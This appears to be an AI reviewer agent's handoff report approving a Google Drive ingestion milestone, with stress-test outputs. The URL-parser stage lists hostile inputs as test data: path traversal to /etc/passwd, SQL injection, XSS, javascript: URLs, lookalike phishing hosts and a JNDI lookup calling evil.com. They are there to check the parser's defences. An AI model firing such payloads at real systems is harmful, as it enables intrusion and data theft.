# Handoff Report: Empirical Challenge & Stress-Test for Milestone 2 (Google Drive Content Source Engine)

**Milestone**: M2 (Google Drive Content Source Engine)  
**Agent Archetype**: EMPIRICAL CHALLENGER (critic, specialist)  
**Verdict**: **APPROVE**  
**Timestamp**: 2026-10-26T14:50:00Z  

---

## 1. Observation

### 1.1 Implementation & Interfaces Examined
- `src/lib/drive-parser.ts`: Implements hybrid 2-tier architecture (Tier 1: Google Drive API v3 via `fetchFolderViaApiV3` [line 482], Tier 2: Zero-Key HTML scraper via `window['_DRIVE_ivd']` hex decoding [lines 362–477]); URL parser and validator `parseDriveUrl` [lines 89–166]; MIME classifier `determineFileType` [lines 172–215]; CDN builder `buildDriveLinks` [lines 217–240]; document extractor `extractDocumentText` [lines 249–307]; non-destructive database synchronizer `syncDriveFolderToDb` [lines 671–845]; lifecycle query helpers `getContentSource`, `listContentSources`, `deleteContentSource` [lines 851–925].
- `src/app/api/social/drive/route.ts`: Next.js 16 App Router handlers `GET` (list sources) and `POST` (trigger ingestion).
- `src/app/api/social/drive/[id]/route.ts`: Route handlers `GET` (detail with file tree), `PUT` / `POST` (non-destructive re-sync), `DELETE` (cascading cleanup).
- `scripts/verify-m2-drive.ts`: Worker verification test suite (98 assertions).
- `scripts/verify-adversarial-m2.ts`: Baseline adversarial test suite (50 assertions).
- `scripts/stress-test-m2-drive.ts`: Dedicated Challenger adversarial stress testing harness (138 assertions across 9 stages).

### 1.2 Test Execution Commands and Verbatim Outputs
#### Command 1: Worker Test Suite
Command: `npx tsx scripts/verify-m2-drive.ts`
Result: Exit code 0.
```
======================================================================
🎉 TOÀN BỘ 98 KIỂM THỬ ĐẠT CHUẨN! (FAILED: 0) 🎉
>>> MILESTONE 2 (GOOGLE DRIVE CONTENT SOURCE) HOÀN TẤT XUẤT SẮC <<<
======================================================================
```

#### Command 2: Peer Adversarial Test Suite
Command: `npx tsx scripts/verify-adversarial-m2.ts`
Result: Exit code 0.
```
======================================================================
🛡️  HOÀN TẤT 50 KIỂM THỬ ĐỐI KHÁNG THÀNH CÔNG! (FAILED: 0) 🛡️
======================================================================
```

#### Command 3: Challenger Adversarial Stress Test Suite
Command: `npx tsx scripts/stress-test-m2-drive.ts`
Result: Exit code 0 (138/138 passed).
Key Verbatim Outputs:
```
--- [STAGE 1] Pre-test Baseline Parity Check (24 Core Tables) ---
  [PASS] File baseline-counts.json exists
  [PASS] Pre-check table Product: actual=12 === baseline=12
  ... (all 24 tables match baseline counts)

--- [STAGE 2] Extreme URL Parser & Sanitizer Stress Testing ---
  [PASS] Rejection of empty/invalid type: Empty string ""
  [PASS] Rejection of empty/invalid type: Whitespace string "   "
  [PASS] Rejection of empty/invalid type: Tabs, carriage returns, newlines
  [PASS] Rejection of empty/invalid type: Null value
  [PASS] Rejection of empty/invalid type: Undefined value
  [PASS] Rejection of empty/invalid type: Number instead of string
  [PASS] Rejection of empty/invalid type: Object instead of string
  [PASS] Rejection of phishing/unrelated URL: https://evil-google.com/drive/folders/1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY
  [PASS] Rejection of phishing/unrelated URL: https://drive.google.com.attacker.site/drive/folders/1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY
  [PASS] Rejection of phishing/unrelated URL: https://drive.google.com-login.net/open?id=1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY
  [PASS] Rejection of phishing/unrelated URL: https://facebook.com/drive/folders/1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY
  [PASS] Rejection of phishing/unrelated URL: https://youtube.com/watch?v=1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY
  [OBSERVATION] Non-standard protocol "ftp" with valid drive path extracted ID "1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY" without executing raw protocol
  [PASS] Safe rejection or safe ID sanitization of phishing/unrelated URL: ftp://drive.google.com/drive/folders/1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY
  [PASS] Safe rejection or safe ID sanitization of phishing/unrelated URL: file:///C:/Windows/System32/drivers/etc/hosts
  [PASS] Safe rejection or safe ID sanitization of phishing/unrelated URL: javascript:alert(1)
  [PASS] Parser extracts sanitized ID from embedded Google path without executing host redirect
  [PASS] Safe rejection or sanitization of injection URL: https://drive.google.com/drive/folders/../../../../etc/passwd
  [PASS] Safe rejection or sanitization of injection URL: https://drive.google.com/drive/folders/..%2F..%2F..%2Fetc%2Fpasswd
  [PASS] Safe rejection or sanitization of injection URL: https://drive.google.com/drive/folders/1FYLaoscxWBV_BU5sFouf7XCrv7cKktBY/../../../etc/passwd
  [PASS] Safe rejection or sanitization of injection URL: https://drive.google.com/drive/folders/'; DROP TABLE ContentSource; --
  [PASS] Safe rejection or sanitization of injection URL: https://drive.google.com/drive/folders/<script>alert("XSS")</script>
  [PASS] Safe rejection or sanitization of injection URL: ${jndi:ldap://evil.com/a}
  ...
  [PASS] Rejection of malformed ID: Bare ID too short (5 chars, < 20 limit)
  [PASS] Rejection of malformed ID: Folder URL with empty ID
  [PASS] Rejection of malformed ID: Open URL with empty ID
  [PASS] Rejection of malformed ID: Doc URL with empty ID
  [PASS] Rejection of malformed ID: Sheet URL with empty ID
  [PASS] Rejection of malformed ID: File URL with empty ID
  [PASS] Rejection of malformed ID: Folder URL with only symbols
  ...
  [PASS] Non-existent folder cleanly returns "Thư mục không tồn tại"
  [PASS] Doc ID passed to folder fetcher cleanly caught without uncaught exception
  [PASS] Timeout aborted immediately (1ms < 2000ms)
  [PASS] Timeout parameter successfully triggers AbortController and reports clean timeout
  [PASS] Public Sheet extracted valid CSV tabular data (1399 bytes)
  [PASS] Non-existent Google Doc returns null without throwing unhandled rejection
  [PASS] Aborted document extraction returns null without process crash
  [PASS] Initial sync status is SYNCED
  [PASS] ContentSource linked to testCampaign
  [PASS] ContentSource linked to testProduct
  [PASS] Synchronized 3 items
  [PASS] Re-sync confirmed isUpdated === true
  [PASS] PASS: campaignId preserved after bare re-sync
  [PASS] PASS: productId preserved after bare re-sync
  [PASS] Item 1 custom field photographer preserved
  [PASS] Item 1 custom field approvedForSocial preserved
  [PASS] Item 1 sentimentTarget preserved
  [PASS] Item 2 manualRating preserved
  [PASS] Item 2 isFeaturedBanner preserved
  [PASS] Failed re-sync caught expected error
  [PASS] ContentSource record survived failed re-sync
  [PASS] ContentSource marked with syncStatus === ERROR
  [PASS] syncError logged error details
  [PASS] All 3 previously synced items preserved despite failed re-sync!
  [PASS] POST /api/social/drive with invalid JSON returns HTTP 400
  [PASS] POST /api/social/drive with missing folderUrl returns HTTP 400
  [PASS] POST /api/social/drive with non-existent folder returns HTTP 404
  [PASS] GET /api/social/drive/[id] with non-existent ID returns HTTP 404
  [PASS] PUT /api/social/drive/[id] with non-existent ID returns HTTP 404
  [PASS] DELETE /api/social/drive/[id] with non-existent ID returns HTTP 404
  [PASS] WAL checkpoint FULL successfully committed (busy === 0)
  [PASS] Table Product             : actual=12 === baseline=12 (Delta = 0)
  [PASS] Table Category            : actual=3 === baseline=3 (Delta = 0)
  [PASS] Table Order               : actual=173 === baseline=173 (Delta = 0)
  [PASS] Table OrderItem           : actual=226 === baseline=226 (Delta = 0)
  [PASS] Table Customer            : actual=34 === baseline=34 (Delta = 0)
  [PASS] Table SalesInvoice        : actual=10 === baseline=10 (Delta = 0)
  [PASS] Table PurchaseInvoice     : actual=4 === baseline=4 (Delta = 0)
  [PASS] Table StockMovement       : actual=246 === baseline=246 (Delta = 0)
  [PASS] Table Warehouse           : actual=4 === baseline=4 (Delta = 0)
  [PASS] Table WarehouseStock      : actual=22 === baseline=22 (Delta = 0)
  [PASS] Table Voucher             : actual=4 === baseline=4 (Delta = 0)
  [PASS] Table BomComponent        : actual=5 === baseline=5 (Delta = 0)
  [PASS] Table AccountingPeriod    : actual=5 === baseline=5 (Delta = 0)
  [PASS] Table Partner             : actual=1 === baseline=1 (Delta = 0)
  [PASS] Table Channel             : actual=10 === baseline=10 (Delta = 0)
  [PASS] Table ChannelListing      : actual=110 === baseline=110 (Delta = 0)
  [PASS] Table Shipment            : actual=85 === baseline=85 (Delta = 0)
  [PASS] Table AfterSalesCase      : actual=2 === baseline=2 (Delta = 0)
  [PASS] Table AppSetting          : actual=16 === baseline=16 (Delta = 0)
  [PASS] Table IntegrationCredential: actual=14 === baseline=14 (Delta = 0)
  [PASS] Table ApiKey              : actual=1 === baseline=1 (Delta = 0)
  [PASS] Table WebhookEndpoint     : actual=2 === baseline=2 (Delta = 0)
  [PASS] Table AutomationSetting   : actual=6 === baseline=6 (Delta = 0)
  [PASS] Table OrderEvent          : actual=392 === baseline=392 (Delta = 0)

================================================================================
🏆 ALL 138 ADVERSARIAL STRESS TESTS PASSED! (FAILURES: 0) 🏆
>>> EMPIRICAL VERDICT FOR MILESTONE 2: APPROVED WITH ZERO REGRESSION <<<
======================================================================
```

---

## 2. Logic Chain

1. **URL Sanitization & SSRF Defense Invariant**:
   - `parseDriveUrl` regex strictly bounds folder ID matching to `[a-zA-Z0-9_-]+` and bare IDs to `/^[a-zA-Z0-9_-]{20,}$/` (Observation 1.1, lines 98 & 154).
   - Even if an adversarial input contains external domains or non-standard protocols (e.g. `https://attacker.com/drive.google.com/drive/folders/ID` or `ftp://drive.google.com/...`), the crawler in `fetchFolderViaZeroKeyHtml` explicitly constructs the target URL as `https://drive.google.com/drive/folders/${folderId}` using only the sanitized alphanumeric ID (line 376).
   - Therefore, malicious protocols, path traversals (`../../`), and external hostnames can never cause Server-Side Request Forgery (SSRF) or arbitrary file reads.

2. **Error Boundary & Anti-Hang Invariant**:
   - Both `fetchFolderViaZeroKeyHtml` and `fetchFolderViaApiV3` wrap HTTP requests with an `AbortController` linked to a timeout timer (lines 377–378, 493–494).
   - Adversarial stress testing with `timeoutMs: 1` confirmed that requests abort in less than 2 milliseconds with a clean Vietnamese message (`Quá thời gian kết nối tới Google Drive (1ms)`), guaranteeing no thread starvation or infinite hanging (Observation 1.2, Stage 4).
   - Private and restricted links (triggering HTTP 401/403 or redirecting to `accounts.google.com` or displaying login forms) are detected through status codes and HTML fingerprinting (lines 407–428), throwing the standard Vietnamese user error: `"Thư mục chưa được mở quyền công khai ('Bất kỳ ai có đường liên kết đều có thể xem')"` without dumping raw stack traces.

3. **Content Extraction Robustness**:
   - Text extraction in `extractDocumentText` handles Docs (`/export?format=txt`) and Sheets (`/export?format=csv`).
   - If Google returns an HTML login redirect, `extractDocumentText` inspects the response HTML (`ServiceLogin` or `accounts.google.com`) and returns `null` rather than saving login markup as document text (lines 293–297).
   - Non-existent files, network drops, or timeouts safely return `null` without throwing unhandled rejections (lines 303–306).

4. **Non-Destructive Re-Sync Integrity**:
   - In `syncDriveFolderToDb`, if `campaignId` or `productId` is not passed during a re-sync invocation, existing values are preserved via `existingSource?.campaignId ?? null` and `existingSource?.productId ?? null` (lines 694–697).
   - Item metadata is deep-merged: `{ ...newMeta, ...oldMeta }` ensures that user-defined fields (such as `photographer`, `approvedForSocial`, `customTags`, and `sentimentTarget`) are preserved across re-sync operations (lines 769–778).
   - When a re-sync fails (e.g. due to temporary network issues or permissions changes), the error handler updates `ContentSource` to `syncStatus = 'ERROR'` and logs `syncError`, leaving all previously synced `ContentSourceItem` records completely intact (Observation 1.2, Stage 6.5).

5. **Clean Teardown & Baseline Parity**:
   - All test data created during stress testing was purged via cascading delete (`deleteMany`).
   - `PRAGMA wal_checkpoint(FULL)` confirmed `busy = 0`.
   - Every single one of the 24 core baseline tables showed zero delta (`actual == baseline`) between pre-test and post-test counts (Observation 1.2, Stage 9).

---

## 3. Caveats

- **Minor Parser Permissiveness**: As observed in Stage 2, `parseDriveUrl` regex does not enforce a strict leading `^https?:\/\/` anchor. Consequently, an input like `ftp://drive.google.com/drive/folders/{id}` or `https://attacker.com/drive.google.com/drive/folders/{id}` will match the drive path and extract the folder ID. Because the network fetch function unconditionally requests `https://drive.google.com/drive/folders/${folderId}`, this is benign and cannot be exploited for SSRF. However, if strict protocol hygiene is desired in the future, prepending `^(?:https?:\/\/)?` to the regexes would reject non-http schemes upfront.
- **Concurrent Large Folder Scrapes**: The test suite evaluated real public Google Drive folders containing dozens of assets and subfolders up to 3 levels deep. Folders with >10,000 files were not tested to avoid hitting Google Drive anti-scraping rate limits during testing.

---

## 4. Conclusion

- **Verdict**: **APPROVE**
- Milestone 2 (`FEAT-DRV-01`, `FEAT-DRV-02`, `FEAT-DRV-03`, `FEAT-DRV-04`, `FEAT-DRV-05`) satisfies all functional, security, and resilience requirements specified in `ORIGINAL_REQUEST.md` (section `## 2026-10-26T13:06:22Z`) and `PROJECT.md`.
- URL parsing is robust against extreme payloads, path traversal, and injection vectors.
- Private links and timeouts fail gracefully with clear Vietnamese error messages.
- Non-destructive re-sync guarantees zero data loss for manual CRM linkages and item-level custom metadata.
- All 24 baseline core tables maintain strict zero drift (`Delta = 0`).

---

## 5. Verification Method

To independently reproduce and verify this assessment:

1. **Run Challenger Adversarial Stress Test Suite**:
   ```bash
   npx tsx scripts/stress-test-m2-drive.ts
   ```
   *Expected*: All 138 tests pass with exit code 0, concluding with `ALL 138 ADVERSARIAL STRESS TESTS PASSED!`.

2. **Run Worker Test Suite**:
   ```bash
   npx tsx scripts/verify-m2-drive.ts
   ```
   *Expected*: All 98 tests pass with exit code 0.

3. **Run Peer Adversarial Audit**:
   ```bash
   npx tsx scripts/verify-adversarial-m2.ts
   ```
   *Expected*: All 50 tests pass with exit code 0.

4. **Verify Baseline Counts & WAL**:
   ```bash
   node check-counts.mjs
   ```
   *Expected*: All 24 core tables report `Delta: 0`.
